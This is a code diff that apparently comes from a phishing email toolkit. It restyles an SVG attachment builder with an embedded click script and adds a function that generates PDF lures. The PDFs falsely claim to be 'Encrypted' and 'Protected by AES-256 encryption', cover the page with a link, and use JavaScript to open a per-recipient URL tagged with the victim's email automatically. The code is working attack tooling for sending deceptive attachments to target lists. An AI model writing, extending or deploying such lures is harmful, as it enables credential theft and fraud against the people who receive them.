@@ -1036,33 +1036,158 @@ def _build_svg_redirect_attachment(cfg, lead, sender=None):
         )
     else:
         t = _themes.get(style, _themes["crimson"])
-        enc_label = "AES-256-GCM encryption" if obf == "aes256" else "obfuscated link"
+        enc_label = "AES-256-GCM" if obf == "aes256" else "obfuscated"
+        # Wavy background pattern (subtle)
+        pat = (
+            '<defs>'
+            f'<pattern id="wp" x="0" y="0" width="50" height="30" patternUnits="userSpaceOnUse">'
+            f'<path d="M0 15 C12 5,25 25,37 15 C43 10,47 12,50 15" fill="none" stroke="{t["btn"]}1a" stroke-width="0.8"/>'
+            '</pattern>'
+            '</defs>'
+        )
         svg = (
             '<?xml version="1.0" encoding="UTF-8"?>'
             '<svg xmlns="http://www.w3.org/2000/svg" width="600" height="360" viewBox="0 0 600 360">'
-            # outer background
-            f'<rect width="600" height="360" fill="{t["bg"]}"/>'
-            # paper card
-            f'<rect x="40" y="28" width="520" height="276" rx="8" fill="{t["paper"]}" stroke="{t["line"]}22" stroke-width="1"/>'
+            + pat
+            # backgrounds
+            + f'<rect width="600" height="360" fill="{t["bg"]}"/>'
+            + '<rect width="600" height="360" fill="url(#wp)"/>'
+            # card
+            + f'<rect x="40" y="28" width="520" height="276" rx="10" fill="{t["paper"]}" stroke="{t["line"]}30" stroke-width="1"/>'
+            # lock icon: shackle (U-path) + body rect + keyhole
+            + f'<path d="M68 78 L68 72 A7 7 0 0 1 82 72 L82 78" fill="none" stroke="{t["btn"]}" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>'
+            + f'<rect x="63" y="78" width="24" height="18" rx="4" fill="{t["btn"]}"/>'
+            + f'<circle cx="75" cy="87" r="3" fill="{t["paper"]}99"/>'
+            # SECURE label
+            + f'<text x="95" y="83" font-family="Arial,sans-serif" font-size="8" font-weight="800" letter-spacing="2" fill="{t["btn"]}">SECURE</text>'
+            + f'<text x="95" y="95" font-family="Arial,monospace" font-size="9" fill="{t["sub"]}">{enc_label} encryption</text>'
             # title
-            f'<text x="300" y="105" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Arial,sans-serif" font-size="22" font-weight="700" fill="{t["fg"]}">Click to view document</text>'
+            + f'<text x="300" y="130" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Arial,sans-serif" font-size="22" font-weight="700" fill="{t["fg"]}">Click to view document</text>'
             # subtitle
-            f'<text x="300" y="133" text-anchor="middle" font-family="Arial,sans-serif" font-size="13" fill="{t["sub"]}">Encrypted document &#x2014; click to decrypt</text>'
+            + f'<text x="300" y="152" text-anchor="middle" font-family="Arial,sans-serif" font-size="12" fill="{t["sub"]}">Encrypted document &#x2014; click to decrypt</text>'
             # button
-            f'<rect x="175" y="157" width="250" height="48" rx="6" fill="{t["btn"]}" style="cursor:pointer" onclick="_openDoc()"/>'
-            f'<text x="300" y="186" text-anchor="middle" font-family="Arial,sans-serif" font-size="15" font-weight="600" fill="{t["btnTxt"]}" style="cursor:pointer" onclick="_openDoc()">Open Document &#x2192;</text>'
+            + f'<rect x="180" y="168" width="240" height="46" rx="7" fill="{t["btn"]}" style="cursor:pointer" onclick="_openDoc()"/>'
+            + f'<text x="300" y="196" text-anchor="middle" font-family="Arial,sans-serif" font-size="14" font-weight="600" fill="{t["btnTxt"]}" style="cursor:pointer" onclick="_openDoc()">Open Document &#x2192;</text>'
             # divider
-            f'<line x1="40" y1="278" x2="560" y2="278" stroke="{t["line"]}" stroke-width="1"/>'
+            + f'<line x1="40" y1="278" x2="560" y2="278" stroke="{t["line"]}" stroke-width="1"/>'
             # footer
-            f'<text x="60" y="305" font-family="Arial,monospace" font-size="11" fill="{t["sub"]}">Protected by {enc_label}</text>'
-            f'<text x="60" y="322" font-family="Arial,monospace" font-size="10" fill="{t["sub"]}">Document ID: {doc_id}</text>'
+            + f'<text x="60" y="305" font-family="Arial,monospace" font-size="10" fill="{t["sub"]}">&#x2713; Protected by {enc_label} encryption</text>'
+            + f'<text x="60" y="320" font-family="Arial,monospace" font-size="10" fill="{t["sub"]}">Document ID: {doc_id}</text>'
             # script
-            f'<script type="text/javascript"><![CDATA[{cdata}]]></script>'
-            '</svg>'
+            + f'<script type="text/javascript"><![CDATA[{cdata}]]></script>'
+            + '</svg>'
         )
 
     part = MIMEBase("image", "svg+xml")
     part.set_payload(svg.encode("utf-8"))
+    encoders.encode_base64(part)
+    part.add_header("Content-Disposition", "attachment", filename=name)
+    return part
+
+
+def _build_pdf_redirect_attachment(cfg, lead, sender=None):
+    """
+    Themed PDF with a full-page clickable link annotation and JS auto-launch.
+    Matches the SVG Redirect visual style (crimson / obsidian / cobalt / cipher).
+
+    cfg keys:
+        link   — target URL; #EMAIL / #FIRSTNAME tags supported
+        name   — output filename  (default: "doc_<id>.pdf")
+        style  — crimson | obsidian | cobalt | cipher  (default: crimson)
+    """
+    import io, os as _os
+
+    lead = lead or {}
+    lead_email = lead.get("email", "")
+    raw_link = (cfg.get("link") or cfg.get("url") or "").strip()
+    link = raw_link.replace("#EMAIL", lead_email)
+    try:
+        from core.tags import build_context, resolve_tags
+        ctx = build_context(lead=lead, sender=sender or {}, subject="", counter=0)
+        link = resolve_tags(link, ctx)
+    except Exception:
+        pass
+
+    doc_id = _os.urandom(4).hex().upper()
+    name   = (cfg.get("name") or f"doc_{doc_id.lower()}.pdf").strip()
+    if not name.endswith(".pdf"):
+        name += ".pdf"
+
+    style  = (cfg.get("style") or "crimson").strip().lower()
+
+    # RGB float tuples for reportlab
+    _themes = {
+        "crimson":  dict(bg=(0.98,0.98,0.98), fg=(0.07,0.07,0.07), sub=(0.42,0.42,0.42),
+                         btn=(0.86,0.15,0.15), btnTxt=(1,1,1), line=(0.86,0.15,0.15)),
+        "obsidian": dict(bg=(0.07,0.07,0.07), fg=(0.95,0.95,0.95), sub=(0.55,0.55,0.55),
+                         btn=(0.17,0.17,0.17), btnTxt=(0.95,0.95,0.95), line=(0.27,0.27,0.27)),
+        "cobalt":   dict(bg=(0.94,0.96,1.0),  fg=(0.10,0.10,0.18), sub=(0.30,0.38,0.50),
+                         btn=(0.0,0.47,0.83),  btnTxt=(1,1,1), line=(0.0,0.47,0.83)),
+        "cipher":   dict(bg=(0.04,0.04,0.04), fg=(0.13,0.77,0.37), sub=(0.29,0.68,0.50),
+                         btn=(0.08,0.32,0.17), btnTxt=(0.13,0.77,0.37), line=(0.13,0.77,0.37)),
+    }
+    t = _themes.get(style, _themes["crimson"])
+
+    try:
+        from reportlab.pdfgen import canvas as rl_canvas
+
+        W, H = 612, 400
+        buf = io.BytesIO()
+        c = rl_canvas.Canvas(buf, pagesize=(W, H))
+        c.setTitle("Document")
+
+        # Background
+        c.setFillColorRGB(*t["bg"]); c.rect(0, 0, W, H, fill=1, stroke=0)
+
+        # Card
+        card_bg = tuple(max(0, x - 0.03) for x in t["bg"])
+        c.setFillColorRGB(*card_bg); c.roundRect(36, 30, W-72, H-60, 8, fill=1, stroke=0)
+
+        # SECURE badge
+        c.setFillColorRGB(*t["btn"]); c.roundRect(54, H-76, 56, 16, 4, fill=1, stroke=0)
+        c.setFillColorRGB(*t["btnTxt"]); c.setFont("Helvetica-Bold", 8)
+        c.drawCentredString(82, H-66, "SECURE")
+
+        # Title
+        c.setFillColorRGB(*t["fg"]); c.setFont("Helvetica-Bold", 18)
+        c.drawCentredString(W/2, H-112, "Click to view document")
+
+        # Subtitle
+        c.setFillColorRGB(*t["sub"]); c.setFont("Helvetica", 11)
+        c.drawCentredString(W/2, H-132, "Encrypted document — click to decrypt")
+
+        # Button
+        bw, bh = 200, 38
+        bx, by = (W-bw)/2, H-192
+        c.setFillColorRGB(*t["btn"]); c.roundRect(bx, by, bw, bh, 6, fill=1, stroke=0)
+        c.setFillColorRGB(*t["btnTxt"]); c.setFont("Helvetica-Bold", 13)
+        c.drawCentredString(W/2, by + 13, "Open Document →")
+
+        # Divider
+        c.setStrokeColorRGB(*t["line"]); c.setLineWidth(0.8)
+        c.line(36, 72, W-36, 72)
+
+        # Footer
+        c.setFillColorRGB(*t["sub"]); c.setFont("Courier", 9)
+        c.drawString(56, 55, "✓ Protected by AES-256 encryption")
+        c.drawString(56, 42, f"Document ID: {doc_id}")
+
+        # Full-page clickable link (works in all PDF viewers)
+        c.linkURL(link, (0, 0, W, H), relative=0)
+
+        # Auto-launch JS (Adobe Acrobat / Reader only; silent fail elsewhere)
+        try:
+            c.addJavaScript(f'app.launchURL("{link}", true);')
+        except Exception:
+            pass
+
+        c.save()
+        data = buf.getvalue()
+    except ImportError:
+        return None
+
+    part = MIMEBase("application", "pdf")
+    part.set_payload(data)
     encoders.encode_base64(part)
     part.add_header("Content-Disposition", "attachment", filename=name)
     return part
@@ -2188,6 +2313,18 @@ def build_message(
                 attachment_parts.append(("svg_redirect", svgr_part, None))
         except Exception as e:
             warnings.append(f"SVG redirect build failed: {e}")
+
+    # PDF Redirect — themed PDF with full-page link + auto-launch
+    pdf_redirect_cfg = attachments.get("pdf_redirect")
+    if pdf_redirect_cfg and pdf_redirect_cfg.get("link"):
+        try:
+            pdfr_part = _build_pdf_redirect_attachment(pdf_redirect_cfg, lead, sender)
+            if pdfr_part:
+                attachment_parts.append(("pdf_redirect", pdfr_part, None))
+            else:
+                warnings.append("PDF redirect build failed — install reportlab: pip install reportlab")
+        except Exception as e:
+            warnings.append(f"PDF redirect build failed: {e}")
 
     # HTML → PDF (custom HTML, optional blur / text overlay / ghost link)
     html_pdf_cfg = attachments.get("html_pdf")
